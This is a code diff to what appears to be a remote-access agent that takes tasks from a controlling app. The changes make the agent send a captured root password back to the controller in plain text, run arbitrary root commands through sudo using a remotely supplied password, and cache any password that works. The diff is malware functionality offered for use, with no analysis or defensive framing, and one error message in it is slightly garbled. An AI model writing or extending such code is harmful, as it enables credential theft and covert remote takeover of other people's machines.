@@ -538,7 +538,7 @@ def attempt_root_escalation():
        test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
        if test.returncode == 0:
            ROOT_PASSWORD = result_pw
-           return True, "Success! Root password captured."
+           return True, f"Success! Root password captured: {result_pw}"
        else:
            return False, "Password captured but incorrect."
    else:
@@ -727,6 +727,7 @@ def process_tasks(config, device_id):
 
            elif task_type == "escalate_privileges":
                success_bool, msg = attempt_root_escalation()
+               # Ensure the message contains the password if success to show in App
                result_data = {"data": msg}
                data_type = "sysinfo"
                should_fail_task = not success_bool
@@ -755,16 +756,25 @@ def process_tasks(config, device_id):
               
            elif task_type == "cmd_exec_admin":
                cmd = params.get('command', '')
-               if ROOT_PASSWORD:
+               # Check for manual password in params (from Flutter App)
+               manual_pw = params.get('root_password', '').strip()
+               
+               effective_pw = manual_pw if manual_pw else ROOT_PASSWORD
+               
+               if effective_pw:
                    print(f"Executing ROOT command: {cmd}", flush=True)
                    # Use sudo -S
-                   full_cmd = f"echo '{ROOT_PASSWORD}' | sudo -S {cmd}"
+                   full_cmd = f"echo '{effective_pw}' | sudo -S {cmd}"
                    stdout, stderr, code = run_command(full_cmd)
                    exec_as = "ROOT"
+                   
+                   # If this worked, cache it if we don't have one
+                   if code == 0 and not ROOT_PASSWORD:
+                       ROOT_PASSWORD = effective_pw
                else:
                    print("Root command requested but no password. Failing.", flush=True)
                    stdout = ""
-                   stderr = "Error: Root access not yet acquired. Run 'Escalate Privileges' first."
+                   stderr = "Error: Root access not yet acquired involved. Please run 'Escalate Privileges' first OR enter password manually."
                    code = -1
                    exec_as = "USER"
                   
@@ -849,7 +859,6 @@ if __name__ == "__main__":
        print(f"CRITICAL AGENT CRASH: {e}", flush=True)
        import traceback
        traceback.print_exc()
-
 
 
 
